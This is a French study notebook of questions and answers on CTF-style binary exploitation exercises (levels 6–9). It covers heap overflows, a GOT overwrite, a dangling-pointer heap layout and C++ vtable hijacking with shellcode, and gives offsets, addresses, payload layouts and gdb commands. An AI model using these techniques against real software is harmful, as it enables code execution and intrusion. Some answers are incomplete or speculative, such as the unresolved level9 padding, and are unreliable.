**Le buffer fait 64 bytes (malloc(0x40)). Pourquoi l'offset est 72 et pas 64 ?**

il y a 8 bits de metadonnees de la heap

**Que représentent les 8 bytes supplémentaires ?**

Chaque bloc `malloc()` est précédé d'un **header** qui contient :
```
┌─────────────────────────────────────────┐
│ Header (8 bytes) :                      │
│   - Taille du bloc (4 bytes)            │
│   - Flags (4 bytes)                     │
├─────────────────────────────────────────┤
│ Données (malloc(0x40) = 64 bytes)       │
└─────────────────────────────────────────┘
```

**Comment as-tu confirmé que 72 était le bon offset ?**

```bash
gdb level6
(gdb) run $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"')
(gdb) info registers eip
# eip = 0x63413663 → chercher dans le pattern → position 72
```


**5 : Différence avec les niveaux précédents**



**Dans level1/2, on écrasait EIP (adresse de retour). Ici qu'écrase-t-on ?**
```
Level1/2 :
STACK : [buffer][...][saved EIP] ← On écrase ça
Au ret : EIP = notre adresse

Level6 :
HEAP  : [__dest 64b][header 8b][puVar1] ← On écrase ça
À l'appel : (*puVar1)() = notre adresse
```

**Pourquoi n'a-t-on pas besoin de ; cat ici ?**

pas besoin de faire tourne un sh en continu

**Pourquoi l'argument est passé via argv et non via stdin comme avant ?**

je ne sais pas


## 🎯 Questions de compréhension - Level7
### 1 : La structure du heap
Le code fait 4 malloc() consécutifs :
cpuVar1 = malloc(8);   // Struct A
pvVar2 = malloc(8);   // Buffer A
puVar3 = malloc(8);   // Struct B
pvVar2 = malloc(8);   // Buffer B


**Dessine le layout du heap après ces 4 allocations (comme on a fait en level6).**

trop long fais le

**Pourquoi puVar1[1] = pvVar2 ? Qu'est-ce que ça crée comme structure ?**

ca fait un poitner qui pointe vers un pointeur, comme un eliste chainee en quelque sorte

**Quand strcpy((char *)puVar1[1], argv[1]) s'exécute, où écrit-on exactement ?**

dans la heap



### 2 : La stratégie d'exploitation
La stratégie est en 2 étapes avec 2 argv :

argv[1] : Overflow Buffer A → écrase le pointeur de Struct B
argv[2] : Écrit l'adresse de m() dans la GOT de puts()



**Explique avec tes mots ce que fait argv[1].**

argv[1] = Outil de visée  → Redirige le 2ème strcpy vers la GOT

**Explique avec tes mots ce que fait argv[2].**

argv[2] = La balle        → Écrit l'adresse de m() dans la GOT

**Pourquoi a-t-on besoin de deux arguments pour cette exploitation ?**

**Sans argv[1]** : Le 2ème strcpy écrit dans Buffer B (inoffensif).
**Sans argv[2]** : Rien n'est écrit dans la GOT.



### 3 : Le mécanisme en chaîne


**Après l'overflow d'argv[1], que contient puVar3[1] ?**

```
Avant argv[1] : puVar3[1] = 0x0804a038 (Buffer B)
Après argv[1] : puVar3[1] = 0x08049928 (GOT de puts)
```
**On a remplacé le pointeur vers Buffer B par le pointeur vers la GOT !**

**Quand strcpy((char *)puVar3[1], argv[2]) s'exécute, où écrit-on ?**

```
puVar3[1] = 0x08049928 (GOT de puts)
strcpy(0x08049928, argv[2])
→ Écrit argv[2] à l'adresse 0x08049928
→ GOT[puts] = adresse de m() ✅
```

**Pourquoi écrire l'adresse de m() dans la GOT de puts() ?**

pour remplacer puts par m()
```
puts("~~") est appelé dans le code
→ CPU cherche l'adresse dans GOT[puts]
→ GOT[puts] = adresse de m() (notre overwrite)
→ m() s'exécute à la place de puts()
→ m() affiche le flag ! ✅
```


### 4 : L'offset de 20
Tu trouves un offset de 20 bytes.


**Buffer A fait 8 bytes (malloc(8)). Pourquoi l'offset est 20 et pas 8 ?**

pour les metadonnees

**Décompose les 20 bytes : que représente chaque partie ?**

```
De Buffer A (0x0804a018) jusqu'à puVar3[1] (0x0804a02c) :

0x0804a018   Buffer A        (8 bytes) ← strcpy commence ici
0x0804a020   Header Struct B (8 bytes) ← Métadonnées malloc
0x0804a028   puVar3[0]       (4 bytes) ← Valeur "2" (on s'en fout)
0x0804a02c   puVar3[1]       (4 bytes) ← CIBLE ! On veut écraser ça
```

**Total** :
```
8 (Buffer A) + 8 (header Struct B) + 4 (puVar3[0]) = 20 bytes ✅
```

**Pourquoi doit-on écraser puVar3[1] et pas puVar3[0] ?**

```c
puVar3[0] = 2;                    // Juste une valeur (jamais utilisée après)
puVar3[1] = adresse de Buffer B;  // Le POINTEUR utilisé par strcpy !
```



### 5 : La variable globale c
Le flag est lu dans c avec fgets() avant d'appeler puts().


**Pourquoi le flag est-il dans c au moment où m() s'exécute ?**



**Pourquoi ne pas lire directement le fichier .pass avec m() ?**

impossible

**m() affiche c avec un timestamp. Pourquoi le timestamp ?**

je ne sais pas, osef



### 6 : Comparaison avec level6


**Dans level6, on écrasait directement func_ptr. Ici, c'est en 2 étapes. Explique la différence.**

#### Différence level6 vs level7

**Level6** : Exploitation **directe** en 1 étape
```
Buffer → [overflow] → func_ptr
                         ↓
                      Pointe vers n()
```

**Level7** : Exploitation **indirecte** en 2 étapes (double indirection)
```
Étape 1 : Buffer A → [overflow] → puVar3[1]
                                      ↓
                               Pointe vers GOT[puts]

Étape 2 : strcpy utilise puVar3[1] → Écrit dans GOT[puts]
                                              ↓
                                       = adresse m()
```

**En level6** : On contrôle directement ce qui est appelé.
**En level7** : On contrôle un pointeur qui contrôle où on écrit, puis on écrit une adresse.


**Dans level6, on ciblait une fonction jamais appelée (n()). Ici on cible puts() dans la GOT. Pourquoi cette différence ?**

dis le moi

**Pourquoi cette technique est-elle plus complexe que level6 ?**

dis le moi

# Level8 - Réponses aux questions de compréhension

## Question 1 : La logique du programme

### Que fait la commande `auth` exactement ?

```c
if (strncmp(buffer, "auth ", 5) == 0) {
    auth = malloc(4);           // Alloue 4 bytes sur le heap
    auth[0] = 0;                // Initialise à 0 (NULL byte)
    if (strlen(buffer + 5) < 30) {
        strcpy(auth, buffer + 5);  // Copie le reste de la ligne
    }
}
```

**Explication** :
1. Alloue **4 bytes** pour `auth` sur le heap
2. Met le premier byte à 0
3. Si l'argument fait moins de 30 chars, le copie dans `auth`

**Exemple** :
```
auth test
→ auth pointe vers un bloc de 4 bytes contenant "test\0"
```

### Pourquoi `malloc(4)` alors qu'on copie potentiellement plus de 4 bytes ?

**C'est un bug !** Le développeur a fait une erreur :

```c
auth = malloc(4);              // Alloue SEULEMENT 4 bytes
strcpy(auth, buffer + 5);      // Peut copier jusqu'à 29 bytes !
```

**Résultat** : **Heap overflow** ! Si `buffer + 5` contient plus de 4 bytes, on déborde sur les données adjacentes sur le heap.

**C'est exactement ce qu'on exploite.**

### Que fait la commande `reset` ? Quel est le problème ?

```c
if (strncmp(buffer, "reset", 5) == 0) {
    free(auth);
}
```

**Ce qui se passe** :
1. Libère la mémoire pointée par `auth`
2. **MAIS ne met PAS `auth` à NULL !**

**Le problème : Dangling pointer** :
```c
free(auth);  // Libère la mémoire
// auth pointe toujours vers 0x0804a008 (l'ancienne adresse)
// Mais cette mémoire est maintenant LIBRE
```

**Conséquence** : `auth` pointe vers une zone mémoire qui peut être réallouée par un autre `malloc()` !

### Que fait `service` ?

```c
if (strncmp(buffer, "service", 7) == 0) {
    service = strdup(buffer + 8);
}
```

**Explication** :
1. Lit tout après `"service "` (buffer + 8 car "service " = 8 chars avec l'espace)
2. `strdup()` alloue de la mémoire sur le heap et copie la chaîne
3. `service` pointe vers ce nouveau bloc

**Exemple** :
```
service admin
→ strdup("admin") alloue ~6 bytes et y copie "admin\0"
→ service = 0x0804a018
```

---

## Question 2 : La condition de victoire

### Que lit cette condition ?

```c
if (*(int *)(auth + 32) == 0) {
    fwrite("Password:\n", 1, 10, stdout);
} else {
    system("/bin/sh");  // ← On veut arriver ici !
}
```

**Décodage** :
```c
*(int *)(auth + 32)
  ^^^^   ^^^^^^^^
  Cast   Adresse
  en int auth + 32 bytes

Ça lit 4 bytes (un int) à l'adresse auth + 32
```

**Exemple** :
```
auth = 0x0804a008
auth + 32 = 0x0804a028

*(int *)(0x0804a028) → Lit les 4 bytes à cette adresse
```

### Pourquoi `auth + 32` alors que `malloc(4)` ?

**C'est volontaire (ou un bug de conception) !**

Le développeur vérifie une zone **au-delà** du bloc alloué pour `auth`.

```
auth = malloc(4)  → Alloue 4 bytes

auth + 32 → Pointe 32 bytes APRÈS le début de auth
           → C'est HORS du bloc alloué !
           → Lecture hors limites (out-of-bounds read)
```

**Cette zone mémoire peut contenir** :
- D'autres allocations sur le heap
- Des données résiduelles
- Des headers malloc

**C'est ce qu'on exploite !**

### Pour obtenir le shell, que doit contenir `auth + 32` ?

```c
if (*(int *)(auth + 32) == 0) {
    // Condition FAUSSE → pas de shell
} else {
    system("/bin/sh");  // Condition VRAIE → shell !
}
```

**Pour le shell** : `auth + 32` doit contenir **N'IMPORTE QUOI SAUF 0**.

Si `*(int *)(auth + 32) != 0` → Shell ! ✅

---

## Question 3 : Les variables globales

### Où sont stockées ces variables ?

```c
char *auth = NULL;
char *service = NULL;
```

**Section `.bss`** (variables globales non initialisées) :
```
0x0804a000  .bss  ← auth et service sont ici
```

**Ce sont des POINTEURS** (4 bytes chacun sur 32-bit) qui pointent vers le heap.

### `auth` et `service` pointent vers quoi ?

**Avant toute commande** :
```
auth = NULL (0x00000000)
service = NULL (0x00000000)
```

**Après `auth test`** :
```
auth = 0x0804a008  ← Pointe vers le heap
```

**Après `service admin`** :
```
service = 0x0804a018  ← Pointe vers le heap (allocation différente)
```

### Les pointeurs sont sur la stack ou le heap ?

**Les pointeurs EUX-MÊMES** : Dans la section `.bss` (données globales)
**Ce qu'ils POINTENT** : Sur le heap

```
.bss (0x0804a000) :
┌─────────────────┐
│ auth = 0x0804a008 │ ← Pointeur (4 bytes) dans .bss
└─────────────────┘
        ↓
Heap (0x0804a008) :
┌─────────────────┐
│ "test\0"        │ ← Données sur le heap
└─────────────────┘
```

---

## Question 4 : Le problème avec reset

### Après `free(auth)`, que vaut le pointeur `auth` ?

```c
free(auth);
// auth pointe toujours vers 0x0804a008 !
// Mais cette mémoire est maintenant LIBRE
```

**`free()` ne modifie PAS le pointeur**, seulement l'état de la mémoire.

```
Avant free(auth) :
auth = 0x0804a008 → [données allouées]

Après free(auth) :
auth = 0x0804a008 → [mémoire libre, peut être réallouée]
```

### C'est quoi un dangling pointer ?

**Dangling pointer** (pointeur pendant) = Pointeur qui pointe vers une mémoire qui a été libérée.

```c
char *ptr = malloc(10);
strcpy(ptr, "test");
free(ptr);         // Libère la mémoire
// ptr pointe toujours vers la même adresse !
// Mais cette mémoire est libre → DANGLING POINTER
printf("%s", ptr); // ⚠️ Comportement indéfini !
```

**Correct** :
```c
free(ptr);
ptr = NULL;  // Évite le dangling pointer
```

### Que se passe-t-il si on fait `login` après `reset` ?

```c
reset           // free(auth), mais auth != NULL
login           // Lit auth + 32
```

**Deux scénarios** :

**Scénario 1 : La mémoire n'est pas réallouée**
```
auth + 32 contient toujours 0 → "Password:\n"
```

**Scénario 2 : La mémoire EST réallouée (notre exploit !)**
```
service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
→ strdup() alloue à l'ancienne adresse de auth
→ auth + 32 pointe maintenant DANS le bloc service
→ auth + 32 contient "XXXX" (non NULL)
→ Shell ! ✅
```

---

## Question 5 : La stratégie d'exploitation

### Pourquoi utiliser `service` et pas juste `auth` avec un long input ?

**Avec `auth` seul** :
```c
if (strlen(buffer + 5) < 30) {  // Maximum 29 chars
    strcpy(auth, buffer + 5);
}
```

**Problème** : Limité à 29 chars, et on ne contrôle pas précisément où ça va sur le heap.

**Avec la séquence `auth` + `service`** :
```
1. auth test       → Alloue à 0x0804a008
2. service XXXX... → Alloue juste APRÈS
                   → Tombe à auth + N bytes
```

**Pourquoi c'est mieux** :
- `service` peut être aussi long qu'on veut
- On contrôle précisément le placement sur le heap
- Plus fiable pour atteindre `auth + 32`

### Quand on fait `service`, où est alloué le nouveau buffer ?

**Sur le heap, juste après `auth`** (allocations séquentielles) :

```
Heap après auth test :
0x0804a008  auth (4 bytes + header)

Heap après service XXXX... :
0x0804a008  auth (4 bytes + header)
0x0804a018  service (longueur variable + header)
```

**La distance dépend de** :
- Taille de l'allocation `auth`
- Headers malloc
- Alignement

### Comment `service` permet de satisfaire `auth + 32` ?

**Calcul** :
```
auth = 0x0804a008

Avec headers malloc (8 bytes) :
auth + 32 ≈ 0x0804a008 + 32 = 0x0804a028

Si service est alloué à 0x0804a018 (juste après auth) :
service occupe 0x0804a018 → 0x0804a0XX

auth + 32 (0x0804a028) tombe DANS le bloc service !
```

**Si `service` contient des données** :
```
auth + 32 lit les bytes de service
→ Si service = "XXXXXXXXXXXXXXXXXXXXXXXX"
→ auth + 32 contient "XXXX" (non NULL)
→ Condition vraie → Shell ! ✅
```

---

## Question 6 : Le heap layout

### Layout du heap après `auth test` puis `service test`

```
Avant toute commande :
Heap vide

Après "auth test" :
0x0804a000  Header auth (8 bytes)
0x0804a008  auth: "test\0" (4 bytes alloués, ~5 utilisés)
            ^^^^^^^^^^^^^^
            auth pointe ici

Après "service test" :
0x0804a000  Header auth (8 bytes)
0x0804a008  auth: "test\0" (4 bytes)
0x0804a010  Header service (8 bytes)
0x0804a018  service: "test\0" (~6 bytes)
            ^^^^^^^^^^^^^^^^
            service pointe ici
```

**Note** : Les tailles exactes dépendent de `malloc()` et de l'alignement.

### Où est `auth` ? Où est `service` ?

```
auth = 0x0804a008     (pointeur vers le heap)
service = 0x0804a018  (pointeur vers le heap, ~16 bytes après auth)
```

### Pourquoi `service` se retrouve à `auth + 32` ou proche ?

**Pas exactement à `auth + 32`, mais proche !**

```
auth = 0x0804a008
auth + 32 = 0x0804a028

service = 0x0804a018

Si service contient au moins 16 bytes de données :
service[0..15] = positions 0x0804a018 → 0x0804a027
service[16]    = position 0x0804a028 ← C'est auth + 32 ! ✅
```

**Donc si `service` est assez long, il "recouvre" `auth + 32` !**

---

## Question 7 : strdup()

### Que fait `strdup()` ?

```c
char *strdup(const char *s) {
    size_t len = strlen(s) + 1;
    char *new = malloc(len);
    if (new) strcpy(new, s);
    return new;
}
```

**En résumé** :
1. Calcule la longueur de la chaîne
2. Alloue exactement cette taille (+1 pour `\0`)
3. Copie la chaîne
4. Retourne le pointeur

**Équivalent à** : `malloc()` + `strcpy()`

### Pourquoi `buffer + 8` et pas `buffer + 7` ?

```
buffer = "service test\n"
          0123456789...
          
"service" = 7 caractères
Mais on veut sauter "service " (avec l'ESPACE) = 8 caractères

buffer + 8 = "test\n"
```

**Explication** :
```
buffer[0..6] = "service"
buffer[7]    = " " (espace)
buffer[8..N] = "test\n" ← Ce qu'on veut copier
```

### Différence entre `malloc()` + `strcpy()` et `strdup()` ?

| | malloc() + strcpy() | strdup() |
|---|---|---|
| **Nb d'étapes** | 2 (allouer + copier) | 1 (tout-en-un) |
| **Taille** | Tu choisis | Automatique (strlen + 1) |
| **Erreur possible** | Oublier le +1 pour `\0` | Non |
| **Utilisation** | Plus de contrôle | Plus simple |

**Exemple** :
```c
// Version manuelle
char *copy1 = malloc(strlen(s) + 1);
strcpy(copy1, s);

// Version strdup
char *copy2 = strdup(s);  // Équivalent mais plus court
```

---

## Résumé de la vulnérabilité

**Enchaînement d'exploitation** :

1. **`auth test`** → Alloue 4 bytes à 0x0804a008
2. **`service` + long input** → Alloue juste après auth
3. **Condition `auth + 32`** → Pointe DANS le bloc service
4. **Si service contient des données** → `auth + 32 != 0`
5. **Shell obtenu !** ✅

**Les bugs exploités** :
- `malloc(4)` trop petit
- Pas de vérification sur `auth + 32`
- `free()` sans mettre à NULL (dangling pointer)
- Out-of-bounds read sur `auth + 32`

# Level9 - Questions/Réponses de compréhension

## Question 1 : C++ et les objets

### Qu'est-ce qu'une classe en C++ ?

Une **classe** est un modèle pour créer des objets. Elle définit des données (attributs) et des fonctions (méthodes).

```cpp
class N {
private:
    int value;           // Attribut
    char annotation[100]; // Attribut

public:
    N(int n) { ... }     // Constructeur
    void setAnnotation(char *str) { ... }  // Méthode
};
```

**Différence avec C** :
- C : structures (`struct`) sans méthodes
- C++ : classes avec méthodes et encapsulation

### Qu'est-ce qu'un objet ?

Un **objet** est une instance d'une classe.

```cpp
N *obj1 = new N(5);  // obj1 est un objet de type N
```

**En mémoire** :
```
obj1 → [vtable ptr][annotation[100]][value]
       0x0804a008  (108 bytes sur le heap)
```

### Que fait `new N(5)` ?

```cpp
N *obj1 = new N(5);
```

**Équivalent C** :
```c
N *obj1 = malloc(sizeof(N));
N_constructor(obj1, 5);
```

**Étapes** :
1. Alloue `sizeof(N)` bytes sur le heap (108 bytes ici)
2. Appelle le constructeur `N(5)`
3. Retourne un pointeur vers l'objet

---

## Question 2 : La vtable (table virtuelle)

### Qu'est-ce qu'une vtable ?

Une **vtable** (virtual table) est un tableau de pointeurs vers les méthodes virtuelles d'une classe.

**Chaque objet avec des méthodes virtuelles contient un pointeur vers sa vtable.**

```
Classe N :
┌──────────────────────┐
│ vtable de la classe  │
├──────────────────────┤
│ operator+() @ 0x...  │
│ operator-() @ 0x...  │
└──────────────────────┘

Objet obj1 :
┌──────────────────────┐
│ vtable_ptr → vtable  │ ← Pointe vers la vtable de N
├──────────────────────┤
│ annotation[100]      │
├──────────────────────┤
│ value = 5            │
└──────────────────────┘
```

### Pourquoi une vtable ?

Pour le **polymorphisme dynamique** (appels de méthodes virtuelles résolus à l'exécution).

```cpp
class Base {
    virtual void foo() { ... }
};

class Derived : public Base {
    void foo() override { ... }
};

Base *ptr = new Derived();
ptr->foo();  // Appelle Derived::foo() grâce à la vtable !
```

### Comment fonctionne un appel de méthode virtuelle ?

```cpp
obj2->operator+(obj1);
```

**Étapes** :
1. Lire `obj2->vtable` (premier champ de l'objet)
2. Chercher `operator+` dans la vtable (première entrée)
3. Appeler la fonction à cette adresse

**En assembleur** :
```asm
mov eax, [obj2]        ; Lire vtable pointer
mov edx, [eax]         ; Lire première entrée (operator+)
call edx               ; Appeler la fonction
```

### Où est stockée la vtable ?

**La vtable elle-même** : Dans la section `.rodata` (données read-only du binaire)
**Le pointeur vtable** : Dans chaque objet (premier champ)

```
Binaire (.rodata) :
0x08048xxx  vtable_N:
            [adresse operator+]
            [adresse operator-]

Heap :
0x0804a008  obj1:
            [0x08048xxx] ← Pointe vers vtable_N
            [annotation]
            [value]
```

---

## Question 3 : La vulnérabilité

### Quelle est la vulnérabilité dans setAnnotation() ?

```cpp
void setAnnotation(char *str) {
    size_t len = strlen(str);
    memcpy(this->annotation, str, len);  // ⚠️ Pas de vérification !
}
```

**Problème** : `annotation` fait 100 bytes, mais on peut copier `len` bytes (illimité).

**Heap overflow** : Si `len > 100`, on déborde sur les données adjacentes (l'objet obj2).

### Pourquoi `this + 4` dans le code décompilé ?

```cpp
memcpy(this + 4, str, len);
```

**`this`** = pointeur vers l'objet = `0x0804a008`

**Structure de l'objet** :
```
this + 0 : vtable pointer (4 bytes)
this + 4 : annotation[100] (100 bytes) ← On écrit ici
this + 104 : value (4 bytes)
```

**`this + 4`** saute le pointeur vtable et écrit dans `annotation`.

### Que se passe-t-il si on overflow ?

```
obj1 (0x0804a008):
  +0   : [vtable]
  +4   : [annotation] ← setAnnotation écrit ici
  +104 : [value]

obj2 (0x0804a074 = obj1 + 108):
  +0   : [vtable] ← Si overflow, on écrase ça !
  +4   : [annotation]
  +104 : [value]
```

**Si notre input dépasse 104 bytes** :
- Bytes 0-103 : Remplissent annotation de obj1
- Bytes 104-107 : **Écrasent la vtable de obj2 !**

---

## Question 4 : vtable hijacking

### Qu'est-ce que le vtable hijacking ?

**vtable hijacking** = Remplacer le pointeur vtable d'un objet par une adresse contrôlée.

**Résultat** : Quand une méthode virtuelle est appelée, le programme saute vers notre adresse.

### Comment on exploite ça ?

**Plan** :
1. Créer une **fausse vtable** dans notre payload
2. Overflow obj1 pour **écraser vtable pointer de obj2**
3. Faire pointer vtable de obj2 vers notre fausse vtable
4. Quand `obj2->operator+()` est appelé → exécute notre code !

### Qu'est-ce qu'une fausse vtable ?

C'est juste **une adresse qui pointe vers notre shellcode**.

```
Notre payload :
0x0804a00c: [0x0804a010] ← Fausse vtable (pointe vers shellcode)
0x0804a010: [shellcode]  ← Notre code malveillant
```

**Quand operator+ est appelé** :
```
1. Lit obj2->vtable → 0x0804a00c (notre fausse vtable)
2. Lit première entrée → 0x0804a010 (adresse shellcode)
3. call 0x0804a010 → Exécute notre shellcode ! ✅
```

---

## Question 5 : Construction du payload

### Pourquoi mettre la fausse vtable au début ?

```
Payload : [Fausse vtable][Shellcode][Padding][Adresse fausse vtable]
```

**Raison** : On contrôle où notre payload est copié (`obj1 + 4 = 0x0804a00c`).

**Si fausse vtable est au début** :
- Fausse vtable à `0x0804a00c`
- Elle contient `0x0804a010` (adresse juste après)
- Shellcode à `0x0804a010`

**C'est prévisible et contrôlable !**

### Calcul du padding

**Objectif** : Atteindre exactement la vtable de obj2.

```
obj1 = 0x0804a008
obj1 + 4 = 0x0804a00c  ← Début de notre payload
obj2 = 0x0804a074       ← Cible (vtable de obj2)

Distance : 0x0804a074 - 0x0804a00c = 0x68 = 104 bytes
```

**Notre payload** :
```
[4 bytes fausse vtable] + [28 bytes shellcode] = 32 bytes déjà écrits
Padding nécessaire = 104 - 32 = 72 bytes

Mais le walkthrough utilise 76... pourquoi ?
```

**Correction** : Il faut atteindre `obj2->vtable`, pas `obj2` :
```
obj2 = 0x0804a074
obj2->vtable = obj2 + 0 = 0x0804a074

Mais avec les headers malloc (8 bytes) :
obj2 réel = 0x0804a074 + 8 = 0x0804a07c ?

Non, les objets sont alloués avec new (C++), pas malloc direct.
```

**Test empirique recommandé** : Essayer 72, 76, 80 bytes et voir lequel fonctionne.

### Pourquoi pointer vers 0x0804a00c et pas 0x0804a010 ?

**Deux adresses** :
- `0x0804a00c` : Fausse vtable (contient `0x0804a010`)
- `0x0804a010` : Shellcode

**Mécanisme** :
```
obj2->vtable = 0x0804a00c
               ↓
Lit à 0x0804a00c → trouve 0x0804a010
                   ↓
                   Appelle 0x0804a010 (shellcode)
```

**C'est une indirection** : vtable → première entrée → shellcode.

---

## Question 6 : Le shellcode

### Pourquoi un shellcode et pas juste une adresse ?

**Dans les niveaux précédents** : On avait des fonctions existantes (`n()`, `m()`, `o()`).

**Dans level9** : Aucune fonction utile ! On doit **injecter notre propre code**.

**Shellcode** = Code machine exécutable pour lancer `/bin/sh`.

### Pourquoi 28 bytes exactement ?

C'est la taille du shellcode `execve("/bin/sh")` qu'on a choisi.

**Versions** :
- 21 bytes : Version minimale (level2)
- 28 bytes : Version avec exit propre
- 45+ bytes : Versions avec null-byte handling

**Ici** : 28 bytes car on a besoin d'un exit à la fin.

---

## Question 7 : Différence avec les niveaux précédents

### Level6 vs Level9

| | Level6 | Level9 |
|---|---|---|
| **Langage** | C | C++ |
| **Cible** | Function pointer | vtable pointer |
| **Zone** | Heap | Heap |
| **Mécanisme** | Overflow → func_ptr | Overflow → vtable |
| **Code injecté** | Non (fonction existante) | Oui (shellcode) |

### Pourquoi level9 est plus complexe ?

**C++** :
- Comprendre les objets, vtables, méthodes virtuelles
- Indirection supplémentaire (vtable → fonction)
- Layout mémoire plus complexe

**C (level6)** :
- Structure simple
- Function pointer direct
- Pas d'indirection

---

## Question 8 : Debugging

### Comment vérifier les adresses avec GDB ?

```bash
gdb level9

(gdb) break main
(gdb) run AAAA

# Après les new
(gdb) x/20wx 0x0804a000
# Voir obj1 et obj2

(gdb) print obj1
# Adresse de obj1

(gdb) print obj2
# Adresse de obj2

(gdb) x/4wx obj1
# Voir vtable pointer de obj1
```

### Comment voir la vtable corruption ?

```bash
gdb level9

(gdb) break *main+XXX  # Après setAnnotation
(gdb) run $(python -c 'print "A"*108 + "BBBB"')

(gdb) x/4wx obj2
# obj2[0] devrait être 0x42424242 ("BBBB") ✅
```

---

## Résumé des concepts

1. **C++** : Classes, objets, méthodes virtuelles
2. **vtable** : Table de pointeurs vers méthodes virtuelles
3. **vtable pointer** : Premier champ de chaque objet
4. **Heap overflow** : memcpy sans limite
5. **vtable hijacking** : Remplacer vtable pointer
6. **Fausse vtable** : Pointer vers notre shellcode
7. **Indirection** : vtable → entrée → shellcode